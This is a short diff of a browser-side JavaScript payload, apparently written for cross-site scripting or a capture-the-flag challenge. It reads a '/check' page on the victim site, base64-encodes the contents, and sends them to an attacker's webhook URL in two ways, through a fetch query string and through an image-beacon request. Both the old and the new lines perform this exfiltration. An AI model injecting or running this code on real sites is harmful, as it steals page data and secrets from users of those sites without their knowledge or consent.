@@ -7,9 +7,9 @@ fetch("/check", {
 })
 .then(r => r.text())
 .then(t => {
-    const exfilUrl = `${webhookUrl}?dataImg=${encodeURIComponent(btoa(t))}`;
-    const img = new Image();
-    img.src = exfilUrl;
+    var p = fetch(`${webhookUrl}?dataFetch=${btoa(t)}`);
+    var img = new Image();
+    img.src = `${webhookUrl}?dataImg=${encodeURIComponent(btoa(t))}`;
     document.body.appendChild(img);
-    return fetch(`${webhookUrl}?dataFetch=${btoa(t)}`)
-})
+    return p;
+});
